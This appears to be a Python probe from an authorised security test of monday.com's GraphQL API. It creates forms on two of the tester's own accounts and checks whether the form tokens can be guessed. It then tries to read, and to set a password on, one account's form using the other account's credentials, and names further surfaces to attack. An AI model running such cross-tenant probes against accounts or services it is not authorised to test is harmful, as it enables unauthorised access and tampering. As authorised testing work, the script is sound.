#!/usr/bin/env python3
"""The forms subsystem - the one surface here that is not account-scoped.

    export TOKEN_B=...  TOKEN_C=...
    export CONFIRM_WRITES=yes
    python3 probe_forms.py

Every BOLA test so far failed for the same reason: monday looks objects up
inside the caller's tenant, so C's board simply does not exist for B. That is
correct multi-tenancy and no amount of retrying it will produce a finding.

Forms are different. They are public by design and identified by a formToken
rather than an account-scoped id:

    set_form_password(formToken: String, input: SetFormPasswordInput)
    form(formToken: ...)
    activate_form / deactivate_form / update_form_settings / shorten_form_url

A token, not an id. If that token is guessable, or if the resolver trusts it
without checking which account it belongs to, the tenant boundary that held
everywhere else is not in the path at all.

This script:
  1. creates a form on each account and compares the two tokens for structure,
     shared prefixes and entropy - a token is only interesting if it is short,
     sequential or predictable
  2. reads C's form with B's token
  3. attempts set_form_password on C's form from B, with a control on B's own
     form first so a refusal can be told from a mutation that does not work

Writes: creates a form on B and on C, and sets a password on B's own form. Both
accounts are yours. Nothing is deleted.
"""
import json
import math
import os
import re
import sys
import time
import urllib.error
import urllib.request
from collections import Counter

API = "https://api.monday.com/v2"
TOKEN_B = os.environ.get("TOKEN_B", "")
TOKEN_C = os.environ.get("TOKEN_C", "")
CONFIRM = os.environ.get("CONFIRM_WRITES", "") == "yes"

C_BOARD = "5103704617"
R, G, Y, B, D, N = "\033[31m", "\033[32m", "\033[33m", "\033[1m", "\033[2m", "\033[0m"
OUT = "forms-probe-out"


def post(token, query, pause=1.0):
    req = urllib.request.Request(
        API, data=json.dumps({"query": query}).encode(),
        headers={"Authorization": token, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            body = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
    except Exception as e:
        body = json.dumps({"errors": [{"message": "transport: %s" % e}]})
    time.sleep(pause)
    return body


def save(name, obj):
    os.makedirs(OUT, exist_ok=True)
    with open(os.path.join(OUT, name), "w") as fh:
        json.dump(obj, fh, indent=2)


def sig(field, root="Mutation"):
    """Argument signature of a field, so nothing is called on a guess."""
    q = ('{ __type(name: "%s") { fields { name args { name type { name kind ofType '
         '{ name kind ofType { name kind } } } } } } }' % root)
    try:
        for f in json.loads(post(TOKEN_C, q, 0.4))["data"]["__type"]["fields"]:
            if f["name"] != field:
                continue
            out = []
            for a in f.get("args") or []:
                t = a["type"]
                while t and not t.get("name"):
                    t = t.get("ofType")
                out.append("%s: %s" % (a["name"], (t or {}).get("name")))
            return ", ".join(out)
    except Exception:
        pass
    return None


def verdict(body):
    low = body.lower()
    if "cannot query field" in low or "unknown argument" in low:
        return D + "ABSENT" + N
    if '"errors"' in low:
        if any(k in low for k in ("unauthor", "permission", "forbidden", "not allowed")):
            return G + "denied" + N
        if "not found" in low or "couldn't find" in low:
            return G + "not found" + N
        try:
            return Y + "error " + N + D + json.loads(body)["errors"][0]["message"][:60] + N
        except Exception:
            return Y + "error" + N
    if '"data"' in low and not re.search(r'"data":\s*(null|\{\s*"\w+":\s*null\s*\})', body):
        return R + Bs("SUCCEEDED")
    return Y + "?" + N


def Bs(s):
    return B + s + N


def entropy(s):
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values()) * n


def workspace_of(token, label):
    body = post(token, "{ workspaces(limit: 1) { id name } }")
    m = re.search(r'"id"\s*:\s*"?(\d+)"?', body)
    if not m:
        print("  %s%s has no workspace%s" % (Y, label, N))
        print("     %s%s%s" % (D, body[:200], N))
        return None
    return m.group(1)


def make_form(token, label, workspace):
    """Create a form and return its token, or None.

    create_form takes destination_workspace_id, not board_id - it creates a new
    board with a form attached rather than attaching one to an existing board.
    Passing board_id is what made the previous run test nothing at all.
    """
    if not workspace:
        return None
    q = ('mutation { create_form(destination_workspace_id: "%s", '
         'destination_name: "canary-form-%s") { token id } }' % (workspace, label))
    body = post(token, q)
    if '"errors"' in body:
        q = ('mutation { create_form(destination_workspace_id: "%s", '
             'destination_name: "canary-form-%s") { token } }' % (workspace, label))
        body = post(token, q)
    if '"errors"' in body:
        q = 'mutation { create_form(destination_workspace_id: "%s") { token } }' % workspace
        body = post(token, q)
    save("create_form.%s.json" % label, {"query": q, "response": body})
    m = re.search(r'"token"\s*:\s*"([^"]+)"', body)
    if not m:
        print("  %s%s: could not create a form%s" % (Y, label, N))
        print("     %s%s%s" % (D, body[:260], N))
        return None
    print("  %s%s form token: %s%s" % (G, label, m.group(1), N))
    return m.group(1)


def analyse(tb, tc):
    print("\n%s=== 1. is the form token guessable? ===%s" % (B, N))
    print("%s  a token is only worth attacking if it is short, sequential, or shares"
          "\n  structure between accounts%s\n" % (D, N))
    for label, t in (("B", tb), ("C", tc)):
        if t:
            print("  %-2s len %-4s entropy %-6.1f bits   %s" % (
                label, len(t), entropy(t), t))
    if not (tb and tc):
        return
    shared = 0
    for x, y in zip(tb, tc):
        if x != y:
            break
        shared += 1
    print("\n  shared leading characters: %d" % shared)
    if entropy(tb) < 60:
        print("  %s%sunder ~60 bits - worth trying to enumerate%s" % (Y, B, N))
    elif shared > 6:
        print("  %s%s%d shared characters - the varying part may be small enough"
              " to search%s" % (Y, B, shared, N))
    else:
        print("  %shigh entropy, no shared structure - not guessable. The token is"
              "\n  only useful if you already have it, which limits any finding here"
              "\n  to someone who can already see the form.%s" % (G, N))


def read_across(tb_form, tc_form):
    print("\n%s=== 2. can B read C's form? ===%s\n" % (B, N))
    qsig = sig("form", "Query")
    print("  %sQuery.form(%s)%s" % (D, qsig, N))
    if qsig is None:
        print("  %sform is not a Query field - skipping%s" % (Y, N))
        return
    arg = "formToken" if "formToken" in (qsig or "") else "token"
    for label, tok, who in (("control B->B", tb_form, TOKEN_B),
                            ("attack  B->C", tc_form, TOKEN_B)):
        if not tok:
            print("  %-13s %sno form token%s" % (label, Y, N))
            continue
        q = '{ form(%s: "%s") { id title description active } }' % (arg, tok)
        body = post(who, q)
        print("  %-13s %s" % (label, verdict(body)))
        print("     %s%s%s" % (D, body[:200], N))
        save("form_read.%s.json" % label.split()[0], {"query": q, "response": body})


def password_across(tb_form, tc_form):
    print("\n%s=== 3. can B set a password on C's form? ===%s\n" % (B, N))
    s = sig("set_form_password")
    print("  %sset_form_password(%s)%s" % (D, s, N))
    if not s:
        print("  %snot present - skipping%s" % (Y, N))
        return False

    control_ok = False
    if tb_form:
        q = ('mutation { set_form_password(formToken: "%s", '
             'input: { password: "canary1", enabled: true }) { token } }' % tb_form)
        body = post(TOKEN_B, q)
        v = verdict(body)
        control_ok = "SUCCEEDED" in v
        print("  control  B -> B's own form   %s" % v)
        if not control_ok:
            print("     %s%s%s" % (D, body[:200], N))
    if not control_ok:
        print("     %sthe control did not succeed, so a refusal below is not evidence"
              "\n     of authorisation - the mutation may not work this way.%s" % (Y, N))

    if not tc_form:
        print("  %sno form on C to attack%s" % (Y, N))
        return False
    q = ('mutation { set_form_password(formToken: "%s", '
         'input: { password: "canary2", enabled: true }) { token } }' % tc_form)
    body = post(TOKEN_B, q)
    v = verdict(body)
    print("  attack   B -> C's form       %s" % v)
    print("     %s%s%s" % (D, body[:240], N))
    save("set_form_password.json", {"query": q, "response": body})
    if "SUCCEEDED" in v and control_ok:
        print("  %s%s>>> B set a password on a form in account C." % (R, B))
        print("  Confirm from C's side that the form now demands one, then stop.%s" % N)
        return True
    return False


def main():
    if not TOKEN_B or not TOKEN_C:
        sys.exit("export TOKEN_B and TOKEN_C first")
    if not CONFIRM:
        print(__doc__)
        print("%sThis creates a form on each account. Re-run with CONFIRM_WRITES=yes.%s"
              % (Y, N))
        return

    print("\n%s=== forms: the surface that is not account-scoped ===%s\n" % (B, N))
    print("  %screate_form(%s)%s\n" % (D, sig("create_form") or "?", N))
    wb = workspace_of(TOKEN_B, "B")
    wc = workspace_of(TOKEN_C, "C")
    tb = make_form(TOKEN_B, "B", wb)
    tc = make_form(TOKEN_C, "C", wc)
    if not (tb or tc):
        print("\n%sNo form was created on either account, so nothing below ran."
              % Y)
        print("Read forms-probe-out/create_form.*.json for the argument the mutation"
              "\nis still missing, and this run proves nothing either way.%s" % N)
        return

    analyse(tb, tc)
    read_across(tb, tc)
    hit = password_across(tb, tc)

    print("\n%s--- result ---%s" % (B, N))
    if hit:
        print("  %s%sCross-account write on a token-identified object.%s" % (R, B, N))
        print("  Bodies in %s/. Verify from C before writing it up." % OUT)
    elif tc:
        print("  %sNothing crossed the boundary here either.%s" % (G, N))
    else:
        print("  %sC had no form, so the cross-account case was never exercised."
              " This is%s" % (Y, N))
        print("  %snot a pass.%s" % (Y, N))
        print("""
  If this comes back clean too, that is the answer about this target rather than
  a gap in the testing. monday's object lookups are tenant-scoped and the forms
  path is guarded as well. The remaining surfaces worth a fresh look are the web
  application rather than the public API - the /nhp Next.js routes, the
  WordPress install under /l/, and the session-invalidation test in RUNBOOK
  step 7, which has still never been run and needs only a browser.""")


if __name__ == "__main__":
    main()
